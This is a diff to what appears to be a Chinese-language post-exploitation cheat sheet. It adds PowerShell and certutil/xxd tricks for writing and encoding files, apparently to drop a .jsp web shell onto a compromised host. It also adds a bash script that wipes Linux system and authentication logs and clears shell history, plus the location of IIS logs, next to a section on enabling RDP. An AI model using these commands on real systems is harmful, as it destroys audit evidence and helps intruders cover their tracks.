@@ -61,6 +61,11 @@ echo.123>>a.txt
 echo,123>>a.txt
 type;a.txt
 ```
+powershell写文件
+```
+powershell -c "'a' | Out-File C:\1.txt -Append -NoNewline"
+```
+
 写特殊字符很多的文件，可以用certutil编码再还原。
 ```
 hex
@@ -70,8 +75,7 @@ base64
 certutil -encode 111.jsp 111.txt
 
 mac命令行快速转换hex
-xxd -ps -u Everything.exe > hexoutput.txt
-
+xxd -ps -u Everything.exe | tr -d '\n' >ou.txt
 ```
 
 如下还原
@@ -1089,6 +1093,28 @@ access_log.*.txt
 
 ```
 
+linux 系统日志
+```
+#!/usr/bin/bash
+echo > /var/log/syslog
+echo > /var/log/messages
+echo > /var/log/httpd/access_log
+echo > /var/log/httpd/error_log
+echo > /var/log/xferlog
+echo > /var/log/secure
+echo > /var/log/auth.log
+echo > /var/log/user.log
+echo > /var/log/wtmp
+echo > /var/log/lastlog
+echo > /var/log/btmp
+echo > /var/run/utmp
+rm ~/./bash_history
+history -c
+```
+windows iis日志
+```
+C:\inetpub\logs\LogFiles
+```
 
 
 ## 开3389
